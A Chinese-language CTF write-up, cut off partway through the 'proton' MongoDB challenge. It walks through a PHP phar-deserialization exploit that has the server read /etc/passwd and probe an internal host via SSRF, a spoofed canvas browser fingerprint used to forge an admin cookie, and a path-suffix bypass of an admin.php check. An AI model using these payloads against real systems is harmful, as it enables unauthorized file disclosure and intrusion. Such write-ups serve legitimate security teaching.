看到备份文件中有_destruct与curl，思路也就比较清晰了，大致需要我们上传一个 phar 文件，然后用phar://xx/xx去触发反序列化漏洞。 这里我先测试file:///etc/passwd，用以下代码生成 phar 文件 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpclass CurlClass{ public function httpGet($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);// curl_setopt($ch,CURLOPT_HEADER, false); $output = curl_exec($ch); curl_close($ch); return $output; }}class MainClass{ public function __destruct() { $this-&gt;why = new CurlClass; echo $this-&gt;url; echo $this-&gt;why-&gt;httpGet($this-&gt;url); }}$phar = new Phar(\"zedd.phar\"); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(\"GIF89a\" . \"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub$o = new MainClass();$o-&gt;url = \"file:///etc/passwd\";$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(\"test.txt\", \"test\"); //签名自动计算$phar-&gt;stopBuffering();?&gt; 修改后缀名为 .jpeg ，通过访问phar://uploads/f68caba0b9.jpeg/test.txt，成功获得了file:///etc/passwd的内容。 但是我们如何找 flag 呢，这里其实是比较坑的一个点，其实基本漏洞利用点已经找到了，接下来其实感觉是有些多余的出题设置，通过试探一些常用的 flag 目录路径，都没有找到 flag ，而后在/etc/hosts发现了同一个网段的另一台主机。 如图中的192.168.32.2 7eaef799a0b8，猜想是不是在 192.168.32.0/24 这个段上，或者比较靠前的机器上，当尝试到 192.168.32.3 时，发现有不寻常的返回。 看着有点像用 python 加密出来的东西，搜了一下发现是使用了一个叫ebcdic的 python 库，用了cp1047编码。 解码脚本： 123import ebcdicblob=b'\\xc8\\x85\\x93\\x93\\x96@a\\x86\\x85\\xa3\\x83\\x88\\xa1l\\xad\\xbd_|]M@@\\x94\\x85'print(blob.decode(\"cp1047\")) 得到Hello /fetch~%[]^@)( me 感觉是个 url 之类的，再构造 phar 包，访问 http://192.168.32.3/fetch~%25%5B%5D%5E%40)(，得到 看起来是同样的加密，直接解密就可以了。 123import ebcdicblob=b'\\xc6\\x93\\x81\\x87\\xc0\\xd7\\xc8\\xd7m\\xe2\\xa3\\x99\\x85\\x81\\x94\\xa2m\\x81\\x99\\x85m\\xa3\\xf0\\xf0m\\xd4\\x81\\x89\\x95\\xe2\\xa3\\x99\\x85\\x81\\x94\\xf0\\xd0'print(blob.decode(\"cp1047\")) 最后得到 flag credz ​ Alice is a admin of abc company in india. He knows about hackers and makes a system that can login only from his system and only his browser which is chrome. Hint: ummm maybe that image has something to do with it. Hint2: Admin is uses fresh chrome Hint3: admin has different CanvasFingerprint Hint4: Windows 10 64 bit 题目设置为一个登陆界面，并且有一行注释 1&lt;!-- remember me all the time, credz is not what you need luke --&gt; 尝试了一下 sql 注入，并没有注入点，在尝试弱密码的时候使用admin/admin登录成功，但是页面提示 很直接，让我们伪造 admin 的 cookie ，这就需要我们另寻突破口了，在主页面发现一个貌似用来设置 cookie 的 js 文件： Fps.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244(function(name, context, definition) { if (typeof module !== 'undefined' &amp;&amp; module.exports) { module.exports = definition() } else if (typeof define === 'function' &amp;&amp; define.amd) { define(definition) } else { context[name] = definition() }})('fpbrowser_v1', this, function() { 'use strict'; var Fingerprint = function(options) { var nativeForEach, nativeMap; nativeForEach = Array.prototype.forEach; nativeMap = Array.prototype.map; this.each = function(obj, iterator, context) { if (obj === null) { return } if (nativeForEach &amp;&amp; obj.forEach === nativeForEach) { obj.forEach(iterator, context) } else if (obj.length === +obj.length) { for (var i = 0, l = obj.length; i &lt; l; i++) { if (iterator.call(context, obj[i], i, obj) === {}) return } } else { for (var key in obj) { if (obj.hasOwnProperty(key)) { if (iterator.call(context, obj[key], key, obj) === {}) return } } } }; this.map = function(obj, iterator, context) { var results = []; if (obj == null) return results; if (nativeMap &amp;&amp; obj.map === nativeMap) return obj.map(iterator, context); this.each(obj, function(value, index, list) { results[results.length] = iterator.call(context, value, index, list) }); return results }; if (typeof options == 'object') { this.hasher = options.hasher; this.screen_resolution = options.screen_resolution; this.screen_orientation = options.screen_orientation; this.canvas = options.canvas; this.ie_activex = options.ie_activex } else if (typeof options == 'function') { this.hasher = options } }; Fingerprint.prototype = { get: function() { var keys = []; keys.push(navigator.userAgent); keys.push(navigator.language); keys.push(screen.colorDepth); if (this.screen_resolution) { var resolution = this.getScreenResolution(); if (typeof resolution !== 'undefined') { keys.push(resolution.join('x')) } } keys.push(new Date().getTimezoneOffset()); keys.push(this.hasSessionStorage()); keys.push(this.hasLocalStorage()); keys.push(!!window.indexedDB); if (document.body) { keys.push(typeof(document.body.addBehavior)) } else { keys.push(typeof undefined) } keys.push(typeof(window.openDatabase)); keys.push(navigator.cpuClass); keys.push(navigator.platform); keys.push(navigator.doNotTrack); keys.push(this.getPluginsString()); if (this.canvas &amp;&amp; this.isCanvasSupported()) { keys.push(this.getCanvasFingerprint()) } if (this.hasher) { return this.hasher(keys.join('###'), 31) } else { return this.fingerprint_js_browser(keys.join('###'), 31) } }, fingerprint_js_browser: function(key, seed) { var remainder, bytes, h1, h1b, c1, c2, k1, i; remainder = key.length &amp; 3; bytes = key.length - remainder; h1 = seed; c1 = 0xcc9e2d51; c2 = 0x1b873593; i = 0; while (i &lt; bytes) { k1 = ((key.charCodeAt(i) &amp; 0xff)) | ((key.charCodeAt(++i) &amp; 0xff) &lt;&lt; 8) | ((key.charCodeAt(++i) &amp; 0xff) &lt;&lt; 16) | ((key.charCodeAt(++i) &amp; 0xff) &lt;&lt; 24); ++i; k1 = ((((k1 &amp; 0xffff) * c1) + ((((k1 &gt;&gt;&gt; 16) * c1) &amp; 0xffff) &lt;&lt; 16))) &amp; 0xffffffff; k1 = (k1 &lt;&lt; 15) | (k1 &gt;&gt;&gt; 17); k1 = ((((k1 &amp; 0xffff) * c2) + ((((k1 &gt;&gt;&gt; 16) * c2) &amp; 0xffff) &lt;&lt; 16))) &amp; 0xffffffff; h1 ^= k1; h1 = (h1 &lt;&lt; 13) | (h1 &gt;&gt;&gt; 19); h1b = ((((h1 &amp; 0xffff) * 5) + ((((h1 &gt;&gt;&gt; 16) * 5) &amp; 0xffff) &lt;&lt; 16))) &amp; 0xffffffff; h1 = (((h1b &amp; 0xffff) + 0x6b64) + ((((h1b &gt;&gt;&gt; 16) + 0xe654) &amp; 0xffff) &lt;&lt; 16)) } k1 = 0; switch (remainder) { case 3: k1 ^= (key.charCodeAt(i + 2) &amp; 0xff) &lt;&lt; 16; case 2: k1 ^= (key.charCodeAt(i + 1) &amp; 0xff) &lt;&lt; 8; case 1: k1 ^= (key.charCodeAt(i) &amp; 0xff); k1 = (((k1 &amp; 0xffff) * c1) + ((((k1 &gt;&gt;&gt; 16) * c1) &amp; 0xffff) &lt;&lt; 16)) &amp; 0xffffffff; k1 = (k1 &lt;&lt; 15) | (k1 &gt;&gt;&gt; 17); k1 = (((k1 &amp; 0xffff) * c2) + ((((k1 &gt;&gt;&gt; 16) * c2) &amp; 0xffff) &lt;&lt; 16)) &amp; 0xffffffff; h1 ^= k1 } h1 ^= key.length; h1 ^= h1 &gt;&gt;&gt; 16; h1 = (((h1 &amp; 0xffff) * 0x85ebca6b) + ((((h1 &gt;&gt;&gt; 16) * 0x85ebca6b) &amp; 0xffff) &lt;&lt; 16)) &amp; 0xffffffff; h1 ^= h1 &gt;&gt;&gt; 13; h1 = ((((h1 &amp; 0xffff) * 0xc2b2ae35) + ((((h1 &gt;&gt;&gt; 16) * 0xc2b2ae35) &amp; 0xffff) &lt;&lt; 16))) &amp; 0xffffffff; h1 ^= h1 &gt;&gt;&gt; 16; return h1 &gt;&gt;&gt; 0 }, hasLocalStorage: function() { try { return !!window.localStorage } catch (e) { return true } }, hasSessionStorage: function() { try { return !!window.sessionStorage } catch (e) { return true } }, isCanvasSupported: function() { var elem = document.createElement('canvas'); return !!(elem.getContext &amp;&amp; elem.getContext('2d')) }, isIE: function() { if (navigator.appName === 'Microsoft Internet Explorer') { return true } else if (navigator.appName === 'Netscape' &amp;&amp; /Trident/.test(navigator.userAgent)) { return true } return false }, getPluginsString: function() { if (this.isIE() &amp;&amp; this.ie_activex) { return this.getIEPluginsString() } else { return this.getRegularPluginsString() } }, getRegularPluginsString: function() { return this.map(navigator.plugins, function(p) { var mimeTypes = this.map(p, function(mt) { return [mt.type, mt.suffixes].join('~') }).join(','); return [p.name, p.description, mimeTypes].join('::') }, this).join(';') }, getIEPluginsString: function() { if (window.ActiveXObject) { var names = ['ShockwaveFlash.ShockwaveFlash', 'AcroPDF.PDF', 'PDF.PdfCtrl', 'QuickTime.QuickTime', 'rmocx.RealPlayer G2 Control', 'rmocx.RealPlayer G2 Control.1', 'RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)', 'RealVideo.RealVideo(tm) ActiveX Control (32-bit)', 'RealPlayer', 'SWCtl.SWCtl', 'WMPlayer.OCX', 'AgControl.AgControl', 'Skype.Detection']; return this.map(names, function(name) { try { new ActiveXObject(name); return name } catch (e) { return null } }).join(';') } else { return \"\" } }, getScreenResolution: function() { var resolution; if (this.screen_orientation) { resolution = (screen.height &gt; screen.width) ? [screen.height, screen.width] : [screen.width, screen.height] } else { resolution = [screen.height, screen.width] } return resolution }, getCanvasFingerprint: function() { var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); var txt = 'I am not admin'; ctx.textBaseline = \"top\"; ctx.font = \"12.5px 'Arial'\"; ctx.textBaseline = \"numeric\"; ctx.fillStyle = \"#f60\"; ctx.fillRect(101, 5, 48, 30); ctx.fillStyle = \"#069\"; ctx.fillText(txt, 2, 15); ctx.fillStyle = \"rgba(111, 177, 0.1, 0.7)\"; ctx.fillText(txt, 4, 17); return canvas.toDataURL() } }; return Fingerprint});function bjs_1(e) { var r = new fpbrowser_v1, t = new fpbrowser_v1({ canvas: !0 }), n = r.get(), o = t.get(), i = n + \"\" + o, a = getbrowser(), d = new XMLHttpRequest, s = \"trackuser.php\", w = \"m=\" + i; w += \"&amp;token=\" + e, w += \"&amp;b=\" + a, d.open(\"POST\", s, !0), d.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\"), d.onreadystatechange = function() { if (4 == d.readyState &amp;&amp; 200 == d.status) { d.responseText; \"index.php\" == e &amp;&amp; (document.getElementById(\"loaderDiv\").innerHTML = \"\") } }, d.send(w)}function getbrowser() { var e = !!window.opr &amp;&amp; !!opr.addons || !!window.opera || navigator.userAgent.indexOf(\" OPR/\") &gt;= 0; if (e) return \"Opera\"; var r = \"undefined\" != typeof InstallTrigger; if (r) return \"FireFox\"; var t = Object.prototype.toString.call(window.HTMLElement).indexOf(\"Constructor\") &gt; 0; if (t) return \"Safari\"; var n = !1 || !!document.documentMode; if (n) return \"IE\"; var o = !n &amp;&amp; !!window.StyleMedia; if (o) return \"Edge\"; var i = !!window.chrome &amp;&amp; !!window.chrome.webstore; return i ? \"Chrome\" : \"other Browser\"} 大致进行了一波审计，从index.html中含有的&lt;script&gt; var i='index.html'; bjs_1(i); &lt;/script&gt;开始，发现bjs_l()函数，并且可以抓到请求trackuser.php的包 1234567891011121314POST /trackuser.php HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://localhost/Content-type: application/x-www-form-urlencodedContent-Length: 49Connection: closeCookie: continueCode=PJgGlaHKhetvcbIlToCVsZFLinSyHZuQcgCJfZSbuphvCV9slmH6ET5v08yK; cookieconsent_status=dismiss; PHPSESSID=877d4hrk97pg1qbnpb37sejqh7Cache-Control: max-age=0m=36743815193629702779&amp;token=index.html&amp;b=FireFox 跟进bjs_l()函数，发现初始化了两个fpbrowser_v1类，并且调用了get()函数返回值作为 ajax 请求中 m 的 value 值，关键就在Fingerprint.prototype这里的get函数，这里用keys数组存储了一系列的参数，但是其实主要的只是以下几个，因为其他参数我们完全可以直接用 windows 10 装一个最新的 chrome 来模拟环境，就不需要完全修改参数了 navigator.language — 题目设置已经告诉我们 “Alice is a admin of abc company in india” navigator.userAgent — 题目 hint 给出 windows 10 chrome getTimezoneOffset() — India 的时区 getCanvasFingerprint 大致就是以上因素，我们可以从 hint 中找到大部分的参数，设置navigator.language可以用 india 的 language 解决，getTimezoneOffset我们可以算得到是-300，唯独getCanvasFingerprint我们不太清楚，经过仔细查阅资料知道这个实现的就是Canvas Fingerprinting，而题目中那个注释以及 hint 也给出了，应该就是用 index.html中的那个canvas图片 1&lt;img src=\"data:image/png;base64,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1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABCAs1AAIgAA3BCAsblKFQEEABP4LyQifPIBG84gAAAAASUVORK5CYII=\"&gt; 所以通过这些几个设置，我们就可以得到trackuser.php中请求参数m的值为 2656613544186699742 ，发包得到对应的 Cookie 带着 Cookie 登录 admin/admin，得到下一步 直接访问，发现是个目录列举。 直接访问admin.php，发现not_authorized 而pack-9d392b4893d01af61c5712fdf5aafd8f24d06a10.pack文件则可以直接下载，我们可以通过git tips 只有一个 pack 文件恢复整个系统 得到admin.php文件 123456789101112131415161718192021222324&lt;?phpif ($_SESSION['go']) {true$sp_php = explode('/', $_SERVER['PHP_SELF']);true$langfilename = $sp_php[count($sp_php) - 1];true$pageListArray = array('index.php' =&gt; \"1\");trueif ($pageListArray[$langfilename] != 1) {truetrueecho \"not_authorized\";truetrueHeader(\"Location: index.php?not_authorized\");true} else {truetrueecho \"hackim19{}\";true}} else {trueecho \"you need to complete the first barrier\";}?&gt; 简单审计，获取路径后检查index.php是否存在路径当中，我们用admin.php/index.php就可以简单绕过得到 flag proton ​ Alice web site has been hacked and hackers removed the submit post option and posted some unwanted messages can you get them? Hint mango can be eaten in 60 seconds Mongo Mongo Mongo !!! and this is not a sql Injection 题目设置 访问/getPOST又得到 添加id参数访问 单引号尝试注入，发现报错 注入无果后，看了一下发现是个 Node.js 的站，尝试使用之前的 payload 检查错误信息 然而并没有发现什么可疑的js库，而且题目既然给出了不是 sql 注入的话，我们就需要得另找方向。 MongoDB 中有一个ObjectId的概念，它是一种 MongoDB 的类型 ​ ObjectIds are small, likely unique, fast to generate, and ordered. ObjectId values consist of 12 bytes, where the first four bytes are a timestamp that reflect the ObjectId’s creation. Specifically: a 4-byte value representing the seconds since the Unix epoch, a 5-byte random value, and a 3-byte counter, starting with a random value. 